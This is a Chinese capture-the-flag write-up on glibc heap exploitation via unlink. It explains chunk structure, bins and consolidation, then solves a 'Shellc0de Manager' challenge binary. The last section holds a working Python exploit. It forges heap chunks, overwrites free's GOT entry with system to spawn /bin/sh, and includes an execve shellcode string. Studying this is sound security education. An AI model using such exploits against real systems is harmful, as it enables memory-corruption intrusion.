# Linux堆溢出利用：unlink

> 来源：http://v-v.mom/2016/06/16/linux_heap_unlink/

#  linux堆的结构

##  定义

```
struct malloc_chunk {
  /* # define INTERNAL_SIZE_T size_t */
  INTERNAL_SIZE_T      prev_size;  /* 前一个块的大小(包括头).  */
  INTERNAL_SIZE_T      size;       /* 当前块的大小(包括头) */
  struct malloc_chunk* fd;         /* 这两个指针只在free chunk中存在*/
  struct malloc_chunk* bk;
 
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```


##  allocated chunk

对于一块正在使用的块,其结构应该是这样的:
![1](/2016/06/16/linux_heap_unlink/1.png)

因为堆块总是对齐8字节的,所以最后3bit用不着,为了充分利用3bit,将这最后3bit定义为N M P 3个标志位.

PREV_INUSE(**P**): 表示前一个chunk是否为allocated。
IS_MMAPPED(**M**)：表示当前chunk是否是通过mmap系统调用产生的。
NON_MAIN_ARENA(**N**)：表示当前chunk是否是thread arena。

这里我申请了一个0x100大小的块
![2](/2016/06/16/linux_heap_unlink/2.png)
可以看到,它的实际大小为0x110=0x100+0x10(x64系统)+最后3bit的标志位P为1,代表前一个chunk在使用.

> 如果该块是第一块chunk,它的P标志位也会是1,因为它没有前一块.

##  free chunk

对于free后的块,其结构应该是这样的:
![3](/2016/06/16/linux_heap_unlink/3.png)
**fd**指向后一个自由块
**bk**指向前一个自由块

因为fastbin是单向链表,头插方式插入,所以fd为null

##  TOPchunk

*   当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。
*   该chunk并不属于任何bin，而是在系统当前的所有free chunk(无论哪种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。
*   如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分:

    &gt; 1.  用户请求的chunk(user chunk)
    &gt; 2.  剩余部分的chunk.(remainder chunk)

*   否则，就需要扩展heap或分配新的heap:

    &gt; 在main arena中通过sbrk扩展heap
    &gt; 在thread arena中通过mmap分配新的heap

##  Last Remainder Chunk(最后剩余块)

当用户申请一个小的chunk时,如果small bin 和unsorted bin都没有精确合乎大小的块时,binmaps将逐个扫描bin,如果找到一个比请求的大一点的chunk,就将它分成两块,一块返回,剩余的部分就放到unsorted bin里去,同时它也成为last remainder chunk.

它的作用主要体现在连续的small chunk的分配上:当用户请求一个small chunk,如果small bin没有合适的chunk,就在unsorted chunk里找,假设只有一个chunk–即last remainder chunk,那么将会把该chunk分成两部分.当这个last remainder chunk够大时,重复前面的分配步骤,就能够使连续分配的多个小chunk相邻在一起.

##  fastbinY

对于free掉的chunk,内存管理的时候是按照chunk的大小来管理的,小的就归fastbin,大的就到bins里.
另外,fastbin是单向链表.

*   fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。
*   当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；
*   否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。

![5](/2016/06/16/linux_heap_unlink/5.png)

##  bins

bins包含三种类型的bin:unsorted bins,small bins,large bins.并且每个bin都是循环链表.

**unsorted bin:**
当小块或者大块的chunk被释放的时候,他们会先被安排到这个unsorted bins里,以便再次申请的时候可以快速调用.
如果没有被使用,就会被放到其他bins里

**small bin:**
小于512字节的chunk会被分配到此处,从16字节,24字节,32字节…504字节来分组(总共62组)

**large bin:**
大于等于512字节的chunk会被分配到此处.总共63组:

*   32 bins contain binlist of chunks of size which are 64 bytes apart. ie) First large bin (Bin 65) contains binlist of chunks of size 512 bytes to 568 bytes, second large bin (Bin 66) contains binlist of chunks of size 576 bytes to 632 bytes and so on…
*   16 bins contain binlist of chunks of size which are 512 bytes apart.
*   8 bins contain binlist of chunks of size which are 4096 bytes apart.
*   4 bins contain binlist of chunks of size which are 32768 bytes apart.
*   2 bins contain binlist of chunks of size which are 262144 bytes apart.
*   1 bin contains a chunk of remaining size.

并且每组的大小是按递减顺序存放的.

**bins结构图**:
![6](/2016/06/16/linux_heap_unlink/6.png)

##  chun之间的关系

chunk在内存中的分布:

```
low addr
+---------------------+   <--first chunk ptr
|     prev_size       |
+---------------------+
|     size=0x201      |          
+---------------------+   <--first                  
|                     |
|     allocated       |         
|      chunk          |      
+---------------------+   <--second chunk ptr                
|    prev_size        |         
+---------------------+                     
|    size=0x11        |         
+---------------------+   <--second                  
|     Allocated       |         
|       chunk         |     
+---------------------+   <-- top                  
|     prev_size       |            
+---------------------+                     
|    size=0x205d1     |           
+---------------------+                      
|                     |
|                     |
|                     |
|        TOP          |   
|                     |
|       CHUNK         |    
|                     |
+---------------------+
high addr
```

free chunk的关系
![7](/2016/06/16/linux_heap_unlink/7.png)

##  unlink(针对bins,而不是fastbin)

当需要申请一块内存的时候,会从free chunk列表进行如下unlink操作:

```
chunk->bk->fd = chunk->fd;
chunk->fd->bk = chunk->bk;
```

```
# define unlink(P, BK, FD) {
  FD = P->fd;
  BK = P->bk;
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
    malloc_printerr (check_action, "corrupted double-linked list", P);
  else {
    // unlink 
    FD->bk = BK;
    BK->fd = FD; 
    if (!in_smallbin_range (P->size) && __builtin_expect (P->fd_nextsize != NULL, 0)) {
      /* not the case */ /* ... */
    }
  }
}
```

对于如下的链表关系:
![8](/2016/06/16/linux_heap_unlink/8.png)
我们如果想释放B,需要先做如下判断:

```
B->bk->fd=&B 等价于 BK->fd=&B
B->fd->bk=&B 等价于 FD->bk=&B
```

##  修改chunk,利用unlink修改某个地址的值

对于一个chunk **B1**,假如我能够找到一个地址E,F,使得

```
E->bk(相当于E+3*sizeof(B1))=&B1
F->Fd(相当于F+2*sizeof(B1))=&B1
```

就能通过前面unlink的检查,最终由”BK-&gt;fd = FD;”操作,会导致**P**位置的值变为**E**地址

![9](/2016/06/16/linux_heap_unlink/9.png)

此时,如果我们能对P指向的地址做任意写操作,就能通过再次覆盖修改P的值,继而使P指向我们想修改的任意空间,从而实现对任意地址的任意修改.

##  堆块的合并

当某个块已经被free后,如果此时free相邻的块,就会触发合并操作,分为:向前合并,向后合并.

> 英语的”Consolidate backward”(向后合并):这里我叫做前向合并;
> 英语的”Consolidate forward”(向前合并):这里我叫做后向合并;
> 
> 之所以会出现这个矛盾,是因为在外国人眼里,以被unlink的块A的角度看待合并的,当free块B,它会向前找块A,然后合并起来的过程就像是A向后合并了,所以叫后向合并,但是为了便于理解,我就叫前向合并.别弄错就好.

```
3833  _int_free (mstate av, mchunkptr p, int have_lock){
...
3953    else if (!chunk_is_mmapped(p)) {//假设p为当前块
3959      nextchunk = chunk_at_offset(p, size);//通过计算当前块地址p + 当前块大小size 获取下一块的首地址p1
3963      if (__glibc_unlikely (p == av->top)){}//如果当前块p是top chunk 就提示double free

//如果下一块p1的地址超出了top chunk的地址,出错
3969      if (__builtin_expect (contiguous (av)&& (char *) nextchunk>= ((char *) av->top + chunksize(av->top)), 0)){}

//或者块p本身就是free的,也出错
3977      if (__glibc_unlikely (!prev_inuse(nextchunk))){}

3983      nextsize = chunksize(nextchunk);//获取p1的大小
3984      if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)|| __builtin_expect (nextsize >= av->system_mem, 0)){}//SIZE_SZ代表最小的堆块结构
3991      free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

//后向合并
3994      if (!prev_inuse(p)) {//如果前一块p0不在使用,即前一块p0是已经free的,那么我们就可以直接把当前块合并到前一块去
3995        prevsize = p->prev_size;//获取前一块p0的大小
3996        size += prevsize;//获取这两块的总大小
3997        p = chunk_at_offset(p, -((long) prevsize));//获取前一块p0的地址
3998        unlink(av, p, bck, fwd);//从freelist里将前一块拿出来,但是这里并没有把合并的块放回freelist,我想不通
3999      }

//向前合并:如果下一块不是top chunk,就需要向后合并
4001      if (nextchunk != av->top) {
4003        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//获取p1块的在使用标志(获取p1块的下一块p2的pre_inuse标志)
4006        if (!nextinuse) {
//如果后一块是free的,就把把后一块p1从freelist中取出来,把当前块p的size加上后一块p1的size
4007          unlink(av, nextchunk, bck, fwd);
4008          size += nextsize;
4009        } else
4010        clear_inuse_bit_at_offset(nextchunk, 0);//清除p1块的在使用表示

//检查unsorted chunk的块表是否有问题
4018        bck = unsorted_chunks(av);
4019        fwd = bck->fd;
4020        if (__glibc_unlikely (fwd->bk != bck)){}  //如果unsorted chunk的首块 的后块的前块 不是当前unsorted chunk的首块,报错
4025        p->fd = fwd;  //将新p块的fd,bk指向unsorted chunk
4026        p->bk = bck;
4027        if (!in_smallbin_range(size))//如果块的大小不在small bin 里,那么p块就是个large bin
4028          {
4029            p->fd_nextsize = NULL;
4030            p->bk_nextsize = NULL;
4031          }
4032        bck->fd = p;//将新p块合并到unsorted chunk里去
4033        fwd->bk = p;
4034  
4035        set_head(p, size | PREV_INUSE);//将新p块的前一块的在使用标志设位
4036        set_foot(p, size);
4038        check_free_chunk(av, p);
4039      }

//如果前面判断都过了,意味着下一块p1是top块,就把当前块合并到top块里
4045  
4046      else {
4047        size += nextsize;
4048        set_head(p, size | PREV_INUSE);
4049        av->top = p;
4050        check_chunk(av, p);
4051      }
```

简单点说就是:
**前向合并**:
如果检查当前块P的pre_inuse位为0,就把前一块P0从freelist中取出来,这个过程会对P0执行unlink操作.

**后向合并(后一块P1非TOPchunk)**:
通过 块P地址+size 获取块P的后一块P1,再通过P1的后一块P2的pre_inuse位来判断块P1的状态,如果是0,代表P1是free的,对P执行unlink操作

最后,把前面free出来的合并块(A+B)放到unsorted chunk里,如果P1是TOPchunk,就直接合并到TOPchunk.

##  堆块合并的利用

通过前面的理解,我们可以得出这样的结论:

1.  前向合并利用
    如果我分配了两块相邻堆块A,B,通过堆A溢出,把B的pre_inuse置零,
    那么free 堆块B的时候,就会导致对堆块A的unlink操作,而我们对A的内存是有完全操纵权的,如果我对A构造一个fd,bk
    形如上面的B1,那么我就能实现对某个地址的内容做修改

2.  后向合并的利用
    如果我有相邻堆块A,B,通过溢出A,修改堆块B的size为负数,就能在找nextchunk的时候找到A块里我们伪造的块B1’,
    然后再构造一个B2’,使得B2’的pre_inuse为0,让free函数以为B1’块是free的,就会触发对B1’块的unlink操作,
    而B1’块也是我们控制的,把B1’块布置得像B1一样,就能实现堆某个地址的内容做修改了

 

#  分析题目源码

一共有5个可选功能给我们:

```
__int64 Show_Option()
{
  puts("*** Shellc0de Manager ***");
  puts("1. List shellc0de");
  puts("2. New shellc0de");
  puts("3. Edit shellc0de");
  puts("4. Delete shellc0de");
  puts("5. Execute shellc0de");
  puts("6. Exit");
  printf("> ");
  return read_int();
}
```

然后来看看每个函数干嘛：

list

```
i = 0;
node = 0x6016C0LL;
do
{
  while ( *node != 1LL )
  {
    ++i;
    node += 0x18LL;
    if ( i == 0x100 )
      return result;
  }
  printf("SHELLC0DE %d: ", i);
  string = *(node + 16);
  len = *(node + 8);
  ++i;
  node += 0x18LL;
  result = put_0x(string, len);
}
while ( i != 0x100 );
```

可以看到他在输出的时候会向node数组查看长度以及是否被使用的标志状态，然后再输出长度对应的字符串,再来看看

new

```
while ( node->flag )
{
  ++v1;
  ++node;
  if ( v1 == 256 )
    return node;
}
printf("Length of new shellcode: ");
len = read_int();                           // 0x28
info = 0x400EDALL;
if ( (len - 1) <= 0x3FF )
{
  m_buf = malloc(len);
  printf("Enter your shellcode(in raw format): ");
  read_till_len(m_buf, len);
  ++count_shellcode;
  info = 0x400FC0LL;                        // success
  v5 = 3LL * v1;
  shell[v5] = 1LL;
  qword_6016C8[v5] = len;
  qword_6016D0[v5] = m_buf;
}
```

看到函数会一直读取你输入的长度的数据直到你输入超出为止，然后在node数组里面添加信息

再看看

edit

```
printf("Shellcode number: ");
  choice = read_int();
  if ( choice <= 0xFF && (v1 = 3LL * choice, shell[v1] == 1) )
  {
    printf("Length of shellcode: ");
    v3 = read_int();
    if ( (v3 - 1) > 0x3FF )
    {
      result = puts("Invalid shellcode length!");
    }
    else
    {
      printf("Enter your shellcode: ");
      read_till_len(qword_6016D0[v1], v3);
      result = puts("Successfully updated a shellcode.");
    }
  }
```

它并没有重新申请一块空间，而是在原空间地址上扩展长度，从而有机会越界写入

最后看看

delete

```
printf("Shellcode number: ");
   v0 = read_int();
   if ( v0 <= 0xFF && (j = 3LL * v0, shell[j] == 1) )
   {
     v3 = qword_6016D0[j];
     --count_shellcode;
     shell[j] = 0LL;
     qword_6016C8[j] = 0LL;
     free(v3);
     result = puts("Successfully removed a shellcode");
   }
```

可以看到它删除时并没有清除node记录里堆块的地址，只是把标志位和长度置零，所以我们就有了一个地址P使得它指向我们的堆地址

##  利用漏洞

1.  构造如下结构实现对node[0].buf地址的修改:
    ![10](/2016/06/16/linux_heap_unlink/10.png)

1.  edit(0),覆盖到node[0],node[2],node[3],利用node[0].buf指向plt.free,node[2].buf指向plt.puts,node[3].buf指向’/bin/sh\0’

2.  list读取plt的地址,通过计算free与system的地址偏移来计算system的地址,edit(0)把system的地址写到free,最后调用delete(3)来调用system(‘/bin/sh)

```
from zio import *

host='127.0.0.1'
port=2333
t=zio(('./shellman.1'))
shellcode="""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"""
def newshell(length,string):
    t.writeline('2')
    t.read_until(':')
    t.writeline(str(length))
    t.read_until(':')
    t.writeline(string)
    t.read_until('>')

def editshell(no,length,string):
    t.writeline('3')
    t.read_until(':')
    t.writeline(str(no))
    t.read_until(":")
    t.writeline(str(length))
    t.read_until(':')
    t.writeline(string)
    t.read_until('>')

def delshell(no):
    t.writeline('4')
    t.read_until(':')
    t.writeline(str(no))
    t.read_until('>')

def listshell():
    t.writeline('1')
    m=t.read_until('*')[:-1]
    t.read_until('>')
    return m

def hack():
    for i in range(4):
        newshell(0x90,'A'*0x8f)
    payload=l64(0)+l64(0xa0)
    payload+=l64(0x6016d0-24)+l64(0x6016d0-16)
    payload+='B'*0x70
    payload+=l64(0x90)+l64(0xa0)
    editshell(0,len(payload),payload)
    delshell(1)
    t.gdb_hint()
    payload2='A'*0x8+l64(1)+l64(8)+l64(0x601600)# node[0]
    payload2+='A'*3*0x8+l64(1)+l64(8)+l64(0x601610)# node[2]
    payload2+=l64(1)+l64(8)+l64(0x601720)# node[3]->/bin/sh
    payload2+='\\bin\\sh\0'
    editshell(0,len(payload2)+1,payload2)
    t.gdb_hint()
    # t.read_until('>')
    l=listshell()
    temp=l[l.index(':')+2:l.index('\n')]
    free_addr=int(temp.decode('hex')[::-1].encode('hex'),16)
    system_addr=free_addr-0x2a500
    print hex(system_addr)
    editshell(0,8,l64(system_addr))
    t.gdb_hint()
    delshell(3)
    t.interact()

t.read_until('>')
hack()
```

参考:

malloc.c源码:
([https://code.woboq.org/userspace/glibc/malloc/malloc.c.html](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html))

heap unlink:
([https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/](https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/))

Heap struct:
([https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/))